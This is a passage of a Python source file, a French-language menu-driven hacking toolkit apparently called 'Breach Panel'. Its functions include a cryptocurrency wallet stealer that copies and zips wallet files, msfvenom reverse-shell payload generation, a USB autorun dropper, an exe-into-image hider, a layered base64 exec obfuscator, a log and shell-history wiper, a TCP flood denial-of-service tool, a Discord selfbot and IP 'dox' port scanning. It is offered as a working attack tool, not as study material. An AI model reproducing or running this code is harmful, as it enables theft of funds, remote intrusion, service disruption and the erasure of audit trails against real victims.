            print(f"{YELLOW}ID-{random.randint(1000,999999)}{RESET}")

    def crypto_steal(self):
        print(f"\n{GREEN}[+]{RESET} Crypto Stealer")
        os.makedirs("crypto", exist_ok=True)
        if self.system == 'Windows':
            paths = [
                os.path.expanduser("~/AppData/Roaming/Bitcoin/wallet.dat"),
                os.path.expanduser("~/AppData/Roaming/Ethereum/keystore/*"),
                os.path.expanduser("~/AppData/Roaming/Electrum/wallets/*")
            ]
        else:
            paths = [
                os.path.expanduser("~/.bitcoin/wallet.dat"),
                os.path.expanduser("~/.ethereum/keystore/*"),
                os.path.expanduser("~/.monero/wallet/*"),
                os.path.expanduser("~/.electrum/wallets/*")
            ]
        for p in paths:
            subprocess.run(f"cp -r {p} ./crypto/ 2>/dev/null", shell=True)
        subprocess.run("zip -r crypto.zip crypto/", shell=True)
        print(f"{GREEN}[+]{RESET} crypto.zip créé")

    def leaked_db_search(self):
        print(f"\n{GREEN}[+]{RESET} Leaked DB Search")
        query = input("Recherche (email/username): ")
        print(f"{YELLOW}Recherche de '{query}' dans les leaks...{RESET}")
        print(f"{DIM}(Simulation - utilisez HaveIBeenPwned API pour une recherche réelle){RESET}")
        try:
            r = requests.get(f"https://haveibeenpwned.com/api/v3/breachedaccount/{query}", timeout=5)
            if r.status_code == 200:
                data = r.json()
                print(f"{GREEN}[+]{RESET} Leaks trouvés:")
                for breach in data:
                    print(f"  - {breach.get('Name')} ({breach.get('BreachDate')})")
            else:
                print(f"{GREEN}[+]{RESET} Aucun leak trouvé")
        except:
            print(f"{YELLOW}[!]{RESET} Erreur API")

    def hash_cracker(self):
        print(f"\n{GREEN}[+]{RESET} Hash Cracker")
        hash_type = input("Type (md5,sha1,sha256): ")
        hash_val = input("Hash: ")
        wordlist = input("Wordlist: ")
        if not os.path.exists(wordlist):
            print(f"{RED}[!]{RESET} Wordlist inexistante")
            return
        subprocess.run(f"hashcat -m {0 if hash_type=='md5' else 100 if hash_type=='sha1' else 1400} {hash_val} {wordlist} --force", shell=True)

    # ==================== PANEL & TOOLS ====================
    def browser_forge(self):
        print(f"\n{GREEN}[+]{RESET} Browser Forge")
        ua = input("User-Agent (ou laisser vide): ")
        if not ua:
            ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"
        with open("forge.py", "w") as f:
            f.write(f"""import requests,random,time
headers = {{
    'User-Agent':'{ua}',
    'Accept-Language':'fr-FR,fr;q=0.9',
    'DNT':'1',
    'Connection':'keep-alive',
}}
r = requests.get('https://httpbin.org/get', headers=headers)
print(r.text)""")
        print(f"{GREEN}[+]{RESET} forge.py créé")

    def brute_zip(self):
        print(f"\n{GREEN}[+]{RESET} Bruteforce Zip")
        zf = input("Fichier .zip: ")
        if not os.path.exists(zf):
            print(f"{RED}[!]{RESET} Fichier inexistant")
            return
        wl = input("Wordlist: ")
        if not os.path.exists(wl):
            print(f"{RED}[!]{RESET} Wordlist inexistante")
            return
        if self.system in ['Linux', 'Darwin']:
            subprocess.run(f"fcrackzip -D -p {wl} -u {zf}", shell=True)
        else:
            print(f"{YELLOW}[!]{RESET} Utilisez 7z ou un outil tiers sur Windows")

    def obfuscate(self):
        print(f"\n{GREEN}[+]{RESET} Obfuscator")
        src = input("Fichier .py: ")
        if not os.path.exists(src):
            print(f"{RED}[!]{RESET} Fichier inexistant")
            return
        with open(src, "r") as f:
            code = f.read()
        encoded = base64.b64encode(code.encode()).decode()
        layers = 5
        final = f"exec(__import__('base64').b64decode('{encoded}').decode())"
        for _ in range(layers-1):
            final = f"exec(__import__('base64').b64decode('{base64.b64encode(final.encode()).decode()}').decode())"
        with open("obf_" + src, "w") as f:
            f.write(final)
        print(f"{GREEN}[+]{RESET} obf_{src} créé")

    def discord_panel(self):
        print(f"\n{GREEN}[+]{RESET} Discord Bot Panel")
        token = input("Token du bot: ")
        code = f"""import discord
client = discord.Client(intents=discord.Intents.all())
@client.event
async def on_ready():
    print('Bot connecté:', client.user)
    await client.change_presence(activity=discord.Game('Breach Tool'))
@client.event
async def on_message(msg):
    if msg.content.startswith('!ping'):
        await msg.channel.send('Pong!')
client.run('{token}')"""
        with open("bot.py", "w") as f:
            f.write(code)
        print(f"{GREEN}[+]{RESET} bot.py créé")

    def token_panel(self):
        print(f"\n{GREEN}[+]{RESET} Token Panel")
        token = input("Token: ")
        if len(token) > 50 and '.' in token and len(token.split('.')) == 3:
            print(f"{GREEN}[+]{RESET} Token valide (JWT)")
            try:
                header, payload, sig = token.split('.')
                print(f"{YELLOW}Header: {base64.b64decode(header + '==')}{RESET}")
                print(f"{YELLOW}Payload: {base64.b64decode(payload + '==')}{RESET}")
            except: pass
        else:
            print(f"{RED}[!]{RESET} Format invalide")

    def usb_tool(self):
        print(f"\n{GREEN}[+]{RESET} Usb Tool")
        with open("autorun.inf", "w") as f:
            f.write("[AutoRun]\nopen=payload.exe\naction=Open\nicon=payload.exe,0")
        print(f"{GREEN}[+]{RESET} autorun.inf créé")

    def exe_img(self):
        print(f"\n{GREEN}[+]{RESET} Exe to Image")
        exe = input("Fichier .exe: ")
        img = input("Image cible .jpg: ")
        if not os.path.exists(exe) or not os.path.exists(img):
            print(f"{RED}[!]{RESET} Fichiers inexistants")
            return
        with open(exe, "rb") as f:
            data = f.read()
        with open(img, "ab") as f:
            f.write(data)
        print(f"{GREEN}[+]{RESET} {img} modifié")

    def anti_grabb(self):
        print(f"\n{GREEN}[+]{RESET} Anti-Grabb")
        with open(".antigrab", "w") as f:
            f.write("Protected by Breach")
        try:
            os.chmod(".antigrab", 0o000)
            subprocess.run("chattr +i .antigrab 2>/dev/null", shell=True)
        except:
            pass
        print(f"{GREEN}[+]{RESET} Protection activée")

    def self_bot(self):
        print(f"\n{GREEN}[+]{RESET} Self Bot Advanced")
        token = input("Token utilisateur: ")
        code = f"""import discord
client = discord.Client(intents=discord.Intents.all())
@client.event
async def on_message(msg):
    if msg.author == client.user:
        await msg.delete()
@client.event
async def on_ready():
    print('Selfbot actif')
client.run('{token}')"""
        with open("selfbot.py", "w") as f:
            f.write(code)
        print(f"{GREEN}[+]{RESET} selfbot.py créé")

    def db_search(self):
        print(f"\n{GREEN}[+]{RESET} Database Search")
        db = input("Fichier .db: ")
        if not os.path.exists(db):
            print(f"{RED}[!]{RESET} Base inexistante")
            return
        tables = subprocess.run(f"sqlite3 {db} '.tables'", shell=True, capture_output=True, text=True)
        print(f"{YELLOW}Tables: {tables.stdout}{RESET}")
        query = input("Requête SQL: ")
        subprocess.run(f"sqlite3 {db} \"{query}\"", shell=True)

    def payload_generator(self):
        print(f"\n{GREEN}[+]{RESET} Payload Generator")
        lhost = input("LHOST: ")
        lport = input("LPORT: ")
        if self.system in ['Linux', 'Darwin']:
            payloads = [
                f"msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o payload.elf",
                f"msfvenom -p linux/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o payload.elf",
                f"msfvenom -p python/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f raw -o payload.py"
            ]
        else:
            payloads = [
                f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o payload.exe",
                f"msfvenom -p windows/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o payload.exe"
            ]
        for p in payloads:
            subprocess.run(p, shell=True)
        print(f"{GREEN}[+]{RESET} Payloads générés")

    def log_cleaner(self):
        print(f"\n{GREEN}[+]{RESET} Log Cleaner")
        if self.system in ['Linux', 'Darwin']:
            logs = ["/var/log/syslog", "/var/log/auth.log", "/var/log/wtmp", "/var/log/btmp"]
            for log in logs:
                if os.path.exists(log):
                    subprocess.run(f"sudo sh -c 'echo > {log}'", shell=True)
            subprocess.run("history -c", shell=True)
            subprocess.run("rm ~/.bash_history", shell=True)
            print(f"{GREEN}[+]{RESET} Logs nettoyés")
        else:
            subprocess.run("wevtutil cl System", shell=True)
            subprocess.run("wevtutil cl Security", shell=True)
            subprocess.run("wevtutil cl Application", shell=True)
            subprocess.run("del %USERPROFILE%\\AppData\\Local\\Microsoft\\Windows\\History", shell=True)
            print(f"{GREEN}[+]{RESET} Logs nettoyés")

    # ==================== NETWORK & OSINT ====================
    def ip_scan_dox(self):
        print(f"\n{GREEN}[+]{RESET} IP Scan & Dox")
        ip = input("IP: ")
        try:
            r = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
            data = r.json()
            print(f"{YELLOW}Pays: {data.get('country')}")
            print(f"Région: {data.get('regionName')}")
            print(f"Ville: {data.get('city')}")
            print(f"ISP: {data.get('isp')}")
            print(f"Coords: {data.get('lat')}, {data.get('lon')}{RESET}")
            try:
                host = socket.gethostbyaddr(ip)[0]
                print(f"{YELLOW}Reverse DNS: {host}{RESET}")
            except: pass
            print(f"{YELLOW}Scan des ports communs...{RESET}")
            common = [21,22,23,25,53,80,110,135,139,143,443,445,993,995,1723,3306,3389,5900,8080]
            for p in common:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(0.3)
                    if s.connect_ex((ip, p)) == 0:
                        print(f"{GREEN}+ Port {p} ouvert{RESET}")
                    s.close()
                except: pass
        except Exception as e:
            print(f"{RED}[!]{RESET} Erreur: {e}")

    def email_tool(self):
        print(f"\n{GREEN}[+]{RESET} Email Tool v2")
        smtp = input("SMTP: ")
        port = int(input("Port: "))
        user = input("Email: ")
        pwd = input("Mot de passe: ")
        dest = input("Destinataire: ")
        subject = input("Sujet: ")
        msg = input("Message: ")
        code = f"""import smtplib
from email.mime.text import MIMEText
msg = MIMEText('{msg}')
msg['Subject'] = '{subject}'
msg['From'] = '{user}'
msg['To'] = '{dest}'
s = smtplib.SMTP('{smtp}',{port})
s.starttls()
s.login('{user}','{pwd}')
s.send_message(msg)
s.quit()"""
        with open("email_tool.py", "w") as f:
            f.write(code)
        print(f"{GREEN}[+]{RESET} email_tool.py créé")

    def odos_tool(self):
        print(f"\n{RED}[!]{RESET} Odos DoS")
        target = input("IP: ")
        port = int(input("Port: "))
        threads = int(input("Threads: "))
        def flood():
            while True:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((target, port))
                    s.send(b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n\r\n" * 100)
                    s.close()
                except: pass
        for _ in range(threads):
            threading.Thread(target=flood, daemon=True).start()
        print(f"{RED}[!]{RESET} DoS lancé sur {target}:{port} avec {threads} threads")
        try:
            while True: time.sleep(1)
        except KeyboardInterrupt:
            print(f"\n{GREEN}[+]{RESET} Arrêt")

    def osint_email(self):
        print(f"\n{GREEN}[+]{RESET} OSINT Email Search")
        email = input("Email: ")
        domain = email.split('@')[1] if '@' in email else ''
        try:
            r = requests.get(f"https://api.hunter.io/v2/email-verifier?email={email}", timeout=5)
            if r.status_code == 200:
                data = r.json()
                print(f"{YELLOW}Status: {data.get('data',{}).get('status','Inconnu')}{RESET}")
            else:
                subprocess.run(f"dig {domain} MX", shell=True)
        except:
            subprocess.run(f"dig {domain} MX", shell=True)

    def osint_phone(self):
        print(f"\n{GREEN}[+]{RESET} OSINT Phone Search")
        phone = input("Numéro: ")
        try:
            r = requests.get(f"http://apilayer.net/api/validate?number={phone}", timeout=5)
            print(f"{YELLOW}Réponse: {r.text[:500]}{RESET}")
        except:
            print(f"{RED}[!]{RESET} Erreur")

    def osint_username(self):
        print(f"\n{GREEN}[+]{RESET} OSINT Username Search")
        username = input("Pseudo: ")
        sites = {
            "Twitter": f"https://twitter.com/{username}",
            "Instagram": f"https://instagram.com/{username}",
            "GitHub": f"https://github.com/{username}",
            "Reddit": f"https://reddit.com/user/{username}",
            "TikTok": f"https://tiktok.com/@{username}",
            "YouTube": f"https://youtube.com/@{username}",
            "Facebook": f"https://facebook.com/{username}",
            "Telegram": f"https://t.me/{username}"
        }
        for site, url in sites.items():
            try:
                r = requests.get(url, timeout=3)
                if r.status_code == 200:
                    print(f"{GREEN}+ {site}: {url}{RESET}")
                else:
                    print(f"{RED}- {site}: {url}{RESET}")
            except:
                print(f"{RED}- {site}: {url}{RESET}")

    def ip_geolocate(self):
        print(f"\n{GREEN}[+]{RESET} IP GeoLocate")
        ip = input("IP: ")
        try:
            r = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
            data = r.json()
            print(f"{YELLOW}Pays: {data.get('country')}")
            print(f"Région: {data.get('regionName')}")
            print(f"Ville: {data.get('city')}")
            print(f"ISP: {data.get('isp')}")
            print(f"Coords: {data.get('lat')}, {data.get('lon')}{RESET}")
        except:
            print(f"{RED}[!]{RESET} Erreur")

    def dns_lookup(self):
        print(f"\n{GREEN}[+]{RESET} DNS Lookup")
        domain = input("Domaine: ")
        try:
            ips = socket.gethostbyname_ex(domain)
            print(f"{YELLOW}IPs: {', '.join(ips[2])}{RESET}")
            subprocess.run(f"dig {domain} ANY", shell=True)
        except Exception as e:
            print(f"{RED}[!]{RESET} Erreur: {e}")

    def port_scanner(self):
        print(f"\n{GREEN}[+]{RESET} Port Scanner")
        target = input("IP: ")
        ports = input("Ports (ex: 80,443,22,1-1000): ")
        for part in ports.split(','):
            if '-' in part:
                start, end = map(int, part.split('-'))
                for p in range(start, end+1):
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(0.3)
                        if s.connect_ex((target, p)) == 0:
                            print(f"{GREEN}+ {p}{RESET}")
                        s.close()
                    except: pass
            else:
                p = int(part)
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(0.3)
                    if s.connect_ex((target, p)) == 0:
                        print(f"{GREEN}+ {p}{RESET}")
                    s.close()
                except: pass

    def subdomain_enum(self):
        print(f"\n{GREEN}[+]{RESET} Subdomain Enumerator")
        domain = input("Domaine: ")
        wordlist = ["www","mail","ftp","dev","api","admin","test","vpn","dns","ns1","ns2","blog","shop","cdn","cloud","docs"]
        for sub in wordlist:
            try:
                socket.gethostbyname(f"{sub}.{domain}")
                print(f"{GREEN}+ {sub}.{domain}{RESET}")
            except: pass

    def network_sniffer(self):
        print(f"\n{GREEN}[+]{RESET} Network Sniffer")
        if self.system in ['Linux', 'Darwin']:
            iface = input("Interface (ex: eth0): ")
            subprocess.run(f"sudo tcpdump -i {iface} -n -c 10", shell=True)
        else:
            print(f"{YELLOW}[!]{RESET} Utilisez Wireshark sur Windows")

    def ssl_scanner(self):
        print(f"\n{GREEN}[+]{RESET} SSL/TLS Scanner")
        domain = input("Domaine: ")
        subprocess.run(f"openssl s_client -connect {domain}:443 -tls1_2", shell=True)

    def run(self):
        while True:
            self.show_menu()
            choice = input().strip()
            if choice == "0":
                print(f"\n{GREEN}[+]{RESET} Fermeture sécurisée.")
                sys.exit(0)
            elif choice in ["1","2","3","4","5"]:
                while True:
                    self.show_category(choice)
                    cmd = input().strip()
                    if cmd == "00":
                        break
                    elif cmd in self.all_commands:
                        try:
                            self.all_commands[cmd][1]()
                        except Exception as e:
                            print(f"{RED}[!]{RESET} Erreur: {e}")
                        input(f"\n{GREEN}[+]{RESET} Appuyez sur Entrée")
                    else:
                        print(f"{RED}[!]{RESET} Commande invalide")
                        time.sleep(1)
            else:
                print(f"{RED}[!]{RESET} Catégorie invalide")
                time.sleep(1)

if __name__ == "__main__":
    if os.geteuid() != 0 and sys.platform != 'win32':
        print(f"{YELLOW}[!]{RESET} Lancez avec sudo pour toutes les fonctionnalités")
        time.sleep(2)
    panel = BreachPanel()
    panel.run()